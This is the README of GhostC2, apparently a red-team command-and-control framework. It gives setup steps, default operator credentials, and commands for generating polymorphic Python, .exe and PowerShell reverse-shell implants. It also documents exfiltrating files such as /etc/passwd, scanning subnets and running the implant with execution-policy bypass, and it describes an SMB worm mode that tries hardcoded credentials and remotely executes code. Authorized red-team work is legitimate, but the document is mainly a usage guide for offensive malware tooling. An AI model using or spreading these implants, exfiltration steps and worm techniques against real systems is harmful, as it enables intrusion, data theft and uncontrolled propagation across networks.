# 👻 GhostC2
GhostC2 is a lightweight post-exploitation command and control framework built in Python and Flask. It supports real-time communication over WebSockets, polymorphic payload generation, encrypted tasking, and optional `.exe` builds for Windows delivery. Designed for flexibility and stealth, GhostC2 gives operators a clean dashboard for managing beacons.

Check out the wiki for an Operator Quickstart Guide.

---

## 🚀 Features

- 🔐 AES-256 encrypted communication (symmetric)
- 🌐 Real-time bidirectional WebSocket tasking
- 🧠 Operator web console with live terminal view
- 🧼 Polymorphic payload generator with randomized variables
- 🖥️ Optional `.exe` compilation with PyInstaller
- 🛡️ Flask-Login based access control
- 🗞️ SQLite-based task/result logging
- 🔍 Network Port Scanning (`scan <subnet> ports:<port1>,<port2>...`)
- 📂 Interactive File Browser UI (NEW)
- 🧬 Self-Propagating Worm Mode via SMB

---

> **NOTE:**  
> The new file browser feature currently requires payloads generated *without* command obfuscation enabled.  
> Structured/obfuscated custom task support is coming soon!

---

## 📁 Project Structure

```
GhostC2/
├── builds/                     # Compiled payloads (.py, .exe)
├── downloads/                  # Exfiltrated files from agents
├── output/                     # (Optional legacy output dir)
├── payloads/                   # WebSocket and polling Python agents
│   ├── ghost_socket_payload.py
│   └── ...                     # (other agent scripts)
├── server/
│   ├── app.py                  # Main Flask + SocketIO server
│   ├── ps_handler.py           # PowerShell reverse shell TCP listener
│   ├── templates/              # HTML templates for dashboard, console, login
│   └── payloads/               # (Generated PowerShell payloads)
├── tools/
│   ├── generate_payload.py     # Payload generator script
│   └── ps_builder.py           # PowerShell payload builder
├── utils/
│   └── crypto.py               # AES encrypt/decrypt helpers
└── README.md
```

---

## ⚙️ Setup

### 1. Install dependencies
```bash
pip install flask flask-login flask-socketio eventlet pyinstaller
```

### 2. Run the server
```bash
cd server
python app.py
```

Visit [http://localhost:8080](http://localhost:8080)

**Default Login:**
```
Username: admin
Password: ghostpass123
```

---

## 👾 Payloads

### ✅ WebSocket Agent *(experimental – not recommended for active use)*
```bash
python payloads/ghost_socket_payload.py
```

---

### 🧼 Generate Polymorphic Payload *(recommended)*
```bash
# Generate Python payload
python tools/generate_payload.py

# With .exe output
python tools/generate_payload.py --exe
```

---

### 🌐 Example: Generate payload for 10.10.10.10
```bash
python tools/generate_payload.py   --c2 http://10.10.10.10:8080/beacon   --result http://10.10.10.10:8080/result
```

To also compile to `.exe`:
```bash
python tools/generate_payload.py   --c2 http://10.10.10.10:8080/beacon   --result http://10.10.10.10:8080/result   --exe
```

---

## 🖥️ Live Console Terminal

GhostC2 includes a web-based console for interacting with beacons in real-time.

### ✅ Features

- WebSocket-powered command/result loop
- Real-time session interaction
- Preloaded recon commands
- JSON result support (e.g., `scan`)
- Beacon targeting + logging

---

## 📂 Interactive File Browser (NEW)

GhostC2 now supports an interactive file browser for any active beacon.

- Browse directory trees live in the dashboard
- Supports both Linux and Windows paths
- Handles missing/ghost files gracefully
- Requires agent to run **without command obfuscation enabled** for now

### Command
```bash
browse <path>
```
Examples:
```bash
browse /
```
or
```bash
browse C:```

**To use:**  
- Click the 📁 "Browse" button for any beacon in the dashboard
- Navigate folders, see files/sizes, and explore the target system

**Note:**  
Obfuscation support for custom tasks is **coming soon** (see roadmap below).

---

## 📂 File Exfiltration

### Command
```bash
getfile /etc/passwd
```

Agent will:
1. Base64 the file
2. AES encrypt the result
3. Send to server
4. Server saves to `server/downloads/<hostname>/`

---

## 🔍 Network Scanning

### Command
```bash
scan 192.168.0.0/24 ports:80,443,445,3389
```

Agent will:
- Scan the provided subnet and ports
- Return open/closed results in JSON
- Format them in the dashboard

### Example Output
```
$ scan 127.0.0.1/32 ports:80
{
  "127.0.0.1": {
    "80": "open"
  }
}
```

---

## 🧬 Worm Propagation Mode

Payloads generated with `--worm` will:
- Scan local subnet for port 445
- Try hardcoded SMB creds
- Drop and remotely execute `worm.py`

Useful for:
- Simulating worm-like behavior
- Lateral movement in test labs

---

## 🔧 PowerShell Payload Generator

GhostC2 now supports polymorphic PowerShell reverse shell payloads for Windows agents.

### ✅ Features:
- Encrypted TCP reverse shell using `System.Net.Sockets.TcpClient`
- Randomized variable names per build
- Auto-appended `PS C:\>`-style prompt
- Compatible with manual execution or droppers
- Optionally served via `/generate_ps_payload`

---

### 🧪 Generating a PowerShell Payload

To generate a `.ps1` stager:

1. Run the Flask server:
   ```bash
   python3 server/app.py
   ```

2. Navigate to the dashboard and click:
   **“Generate PowerShell Payload”**

3. The generated payload will be saved to:
   ```
   /server/payloads/ps_payload_<timestamp>.ps1
   ```

4. It will be automatically served for download.

---

### 🔌 Running the Payload on Target

Run the payload on a Windows target using:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\ps_payload_20250517_XXXXXX.ps1
```

> ⚠️ Ensure `ps_handler.py` is running and listening on port `1443`:
```bash
sudo python3 server/ps_handler.py
```

---

### 🧼 Customizing the Payload

To change the default connection host/port:

Edit `tools/ps_builder.py`:

```python
host = "YOUR_C2_IP"
port = 1443
```

---

### 📁 Payload Directory Structure

Generated payloads are stored in:
```
server/payloads/
```

They are automatically served via Flask using:
```python
send_from_directory('payloads', filename)
```

---

## 🧠 Roadmap

- `.hta`, `.bat`, and `.vbs` wrappers
- AMSI/ETW bypass options
- Full support for command obfuscation in custom tasks (`browse`, etc.)
- Dashboard-based file download from browser view
- JSON/structured tasking for all agent features
- Dashboard-based one-liners for download & exec

---

## 🔐 Security Notes

- AES-encrypted traffic throughout
- Operator auth required for all access
- Session isolation by beacon hostname

---

## 🧪 Red Team Use Cases

| Scenario              | Usage                                    |
|----------------------|------------------------------------------|
| Post-exploitation    | Remote shell via encrypted WebSocket     |
| Payload generation   | Obfuscated `.py` or `.exe` files         |
| Operator dashboards  | Web UI for task/result review            |
| C2 simulations       | Train detection or analyze traffic       |

---

## ⚠️ Legal

GhostC2 is for **authorized red team or academic use only**.

---

## 🧠 Built by Edward Wolfgang

- GitHub: [@wolfwashere](https://github.com/wolfwashere)
- Project: GhostC2 v1.0
